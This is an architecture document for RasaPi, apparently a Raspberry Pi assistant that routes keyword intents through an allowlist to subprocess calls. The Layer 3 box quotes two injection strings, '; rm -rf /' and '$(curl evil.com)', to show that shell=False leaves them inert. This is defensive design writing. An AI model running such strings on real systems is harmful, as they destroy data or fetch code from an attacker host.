# RasaPi — Architecture

This document describes the **Phase 1** architecture as it actually exists in code today. Future phases will extend specific modules without changing existing interfaces.

---

## High-level system view

```
                            ┌──────────────────────────────────────────────┐
                            │              Raspberry Pi 5                  │
                            │                                              │
   HTTP (LAN only)          │  ┌────────────────────────────────────────┐  │
   ──────────────────────►  │  │           FastAPI Backend              │  │
   GET  /health             │  │                                        │  │
   GET  /commands           │  │  api/routes/health.py                  │  │
   POST /ask                │  │  api/routes/assistant.py               │  │
                            │  └──────────────┬─────────────────────────┘  │
                            │                 │                            │
                            │       ┌─────────▼──────────┐                 │
                            │       │  config.py (.env)  │                 │
                            │       └────────────────────┘                 │
                            │                                              │
                            │  ┌────────────────────────────────────────┐  │
                            │  │              core/                     │  │
                            │  │                                        │  │
                            │  │  intent_router.py  (keyword → intent)  │  │
                            │  │  command_runner.py (subprocess)        │  │
                            │  │  llm.py            (Phase 2 stub)      │  │
                            │  └──────────────┬─────────────────────────┘  │
                            │                 │                            │
                            │  ┌──────────────▼─────────────────────────┐  │
                            │  │            security/                   │  │
                            │  │                                        │  │
                            │  │  allowlist.py  (default-deny gate)     │  │
                            │  │  audit_log.py  → logs/*.jsonl          │  │
                            │  └────────────────────────────────────────┘  │
                            │                                              │
                            └──────────────────────────────────────────────┘
```

The whole stack is one Python process. No daemons, no message queue, no DB in Phase 1 — JSONL on disk is the only persistence layer.

---

## Request flow — `POST /ask`

```
  Client
    │
    │  POST /ask  {"query": "what time is it"}
    ▼
  api/routes/assistant.py
    │  validate body (Pydantic: 1 ≤ len(query) ≤ 2000)
    │  generate request_id (uuid4)
    │  audit_logger.log_request(request_id, query)
    ▼
  core/intent_router.route(query, request_id)
    │
    │  for each Intent in INTENTS:
    │      if any keyword matches query.lower():
    │          if intent has handler:  return handler()
    │          else:                   run_command(cmd, args)
    │  no match → return fallback intent
    │
    ▼
  core/command_runner.run_command(request_id, cmd, args)
    │
    │  AllowlistValidator.validate(CommandRequest)
    │    └─ raises ValidationError on unknown cmd / bad args
    │       → audit_logger.log_command(outcome="rejected")
    │       → returns "Command rejected: …"
    │
    │  subprocess.run([cmd, *args], shell=False, timeout=10)
    │    └─ audit_logger.log_command(outcome="allowed", duration_ms)
    │
    ▼
  api/routes/assistant.py
    │  build AskResponse(request_id, intent, response, source, duration_ms)
    ▼
  Client  ◄── 200 OK with JSON
```

Every step has an audit hook. Every executable path is gated. There is no shortcut from request to subprocess that skips the gates.

---

## Intent router flow

The router is intentionally *not* an LLM. It is a deterministic pipeline that keeps Phase 1's behaviour fully predictable, fully auditable, and fully testable without a model on disk.

```
   query: "How much disk space do I have?"
            │
            │  query.lower().strip()  →  "how much disk space do i have?"
            ▼
   ┌──────────────────────────────────────────────────────────────┐
   │  for intent in INTENTS:                                      │
   │      if any(keyword in query for keyword in intent.keywords):│
   │          MATCH                                               │
   ├──────────────────────────────────────────────────────────────┤
   │                                                              │
   │  greeting   → keywords ("hello","hi ","hey","good morning")  │
   │  help       → ("help","what can you do","commands")          │
   │  time       → ("time","date","what day")                     │
   │  uptime     → ("uptime","how long","been running")           │
   │  cpu_temp   → ("temperature","cpu temp","how hot")           │
   │  disk       → ("disk","storage","space left","free space")  ◄── matches "disk"
   │  memory     → ("memory","ram","free memory")                 │
   │  hostname   → ("hostname","device name")                     │
   │  system     → ("system info","kernel","os version","uname")  │
   │                                                              │
   └──────────────────────────────────────────────┬───────────────┘
                                                  │
                                                  ▼
                          ┌──────────────────────────────────────┐
                          │   intent.handler  OR  intent.command │
                          │                                      │
                          │   greeting / help → handler()         │
                          │   everything else → run_command()    │
                          └──────────────────────────────────────┘

   no match  →  RouteResult(intent="fallback", response="Phase 2 will handle free-form…")
```

**Why keyword-based for Phase 1:**

- Fully deterministic — same input always produces same output
- Auditable in code review (one file, one tuple of intents)
- No model weights, no inference time, no Ollama dependency
- Lets the security model be validated *before* an LLM is in the loop

When Phase 2 adds Ollama, the LLM proposes a structured intent name and the router *still owns the dispatch*. The LLM never executes anything directly.

---

## Command execution — three safety layers

Every successful command exec passes **three independent gates**. Defeating one gate is not enough; an attacker would need to defeat all three simultaneously.

```
   ┌────────────────────────────────────────────────────────────────────┐
   │  LAYER 1 — Intent Router                                           │
   │  ────────────────────────                                          │
   │  Only queries matching a hard-coded keyword set reach an executor. │
   │  Anything else → fallback. Default deny at the language level.     │
   └─────────────────────────────┬──────────────────────────────────────┘
                                 │   matched: cmd="df", args=["-h"]
                                 ▼
   ┌────────────────────────────────────────────────────────────────────┐
   │  LAYER 2 — Allowlist Validator                                     │
   │  ─────────────────────────────                                     │
   │  ALLOWED_COMMANDS = {                                              │
   │      "uptime":   max_args=0                                        │
   │      "date":     max_args=0                                        │
   │      "uname":    max_args=1, allowed_args=["-a","-r","-m","-s"]    │
   │      "df":       max_args=1, allowed_args=["-h"]                   │
   │      "free":     max_args=1, allowed_args=["-h","-m"]              │
   │      "vcgencmd": max_args=1, allowed_args=["measure_temp",…]       │
   │      "ip":       max_args=1, allowed_args=["addr"]                 │
   │      "hostname": max_args=0                                        │
   │  }                                                                 │
   │                                                                    │
   │  Rejects:                                                          │
   │   - command not in dict                  → ValidationError         │
   │   - too many args                        → ValidationError         │
   │   - arg not in spec.allowed_args         → ValidationError         │
   └─────────────────────────────┬──────────────────────────────────────┘
                                 │  validated
                                 ▼
   ┌────────────────────────────────────────────────────────────────────┐
   │  LAYER 3 — subprocess with shell=False                             │
   │  ─────────────────────────────────────                             │
   │  subprocess.run(                                                   │
   │      [cmd, *args],   ← Python list, NOT a string                   │
   │      shell=False,    ← no /bin/sh involvement                      │
   │      timeout=10,     ← caps runaway processes                      │
   │      capture_output=True, text=True                                │
   │  )                                                                 │
   │                                                                    │
   │  Because args are a list and no shell is invoked:                  │
   │   - "; rm -rf /" inside an arg becomes a literal arg, not a chain  │
   │   - "$(curl evil.com)" is never expanded                           │
   │   - globs, redirects, pipes are inert                              │
   └────────────────────────────────────────────────────────────────────┘
```

If any layer rejects, the audit log records `outcome="rejected"` (or `"error"`) with the reason, and the user gets a polite error string — never a stack trace.

---

## Module responsibilities

| Module | Responsibility | Depends on |
|---|---|---|
| `backend/main.py` | App factory, lifespan, router registration | config, routes |
| `backend/config.py` | Type-safe settings from `.env` | pydantic-settings |
| `api/routes/health.py` | `GET /health` — liveness, version | config |
| `api/routes/assistant.py` | `POST /ask`, `GET /commands` | intent_router, audit_log |
| `core/intent_router.py` | Keyword matching, intent dispatch | command_runner |
| `core/command_runner.py` | Validated subprocess execution | allowlist, audit_log |
| `core/llm.py` | **Phase 2 stub** — not called in Phase 1 | config |
| `security/allowlist.py` | Default-deny command whitelist | — |
| `security/audit_log.py` | Append-only JSONL event sink | config |

---

## Technology choices

| Component | Choice | Reason |
|---|---|---|
| Web framework | FastAPI | Async, typed, auto-docs, Pi-compatible |
| Config | pydantic-settings | Type-safe `.env` loading |
| Local LLM (Phase 2) | Ollama | Best Pi 5 support, easy model swap |
| Test framework | pytest + httpx TestClient | Standard, async-aware |
| Audit format | JSONL | Streamable, grep-friendly, no DB needed |
| Process manager (deploy) | systemd (Phase 5) | Native, no extra deps on Pi |

---

## Phase 2+ extension points

Each module exposes a stable interface so later phases can plug in without disturbing what already works.

| Module | Phase 2+ extension |
|---|---|
| `core/llm.py` | Replace stub with real Ollama HTTP calls; LLM emits structured intent JSON, router still dispatches |
| `core/intent_router.py` | Add new intents to the `INTENTS` tuple; no logic change required |
| `security/allowlist.py` | Move whitelist to a YAML file loaded at startup |
| `security/audit_log.py` | Add a remote sink (syslog, Loki) alongside JSONL |
| `api/routes/` | Drop in `voice.py` (Phase 4), `reminders.py` (Phase 3) without touching existing routes |
